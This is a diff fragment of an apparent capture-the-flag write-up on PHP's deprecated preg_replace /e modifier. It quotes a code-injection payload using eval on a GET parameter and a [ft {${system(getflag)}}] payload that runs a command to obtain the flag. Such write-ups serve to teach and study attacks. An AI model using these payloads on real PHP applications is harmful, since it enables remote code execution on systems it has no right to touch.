@@ -16,6 +16,10 @@ Or just exploit this single small script on this folder.
 [ft whateverMalicous]
 ```
 # https://wiki.php.net/rfc/remove_preg_replace_eval_modifier
+```
+For example the above example can be used to execute arbitrary PHP code by passing the string <h1>{${eval($_GET[php_code])}}</h1>. The evaluted code in this case would be "<h1>" . strtoupper("{${eval($_GET[php_code])}}") . "</h1>" and as such execute any PHP code passed in the php_code GET variable.
+```
+
 # in our case we want the flag so
 ```
 [ft {${system(getflag)}}]
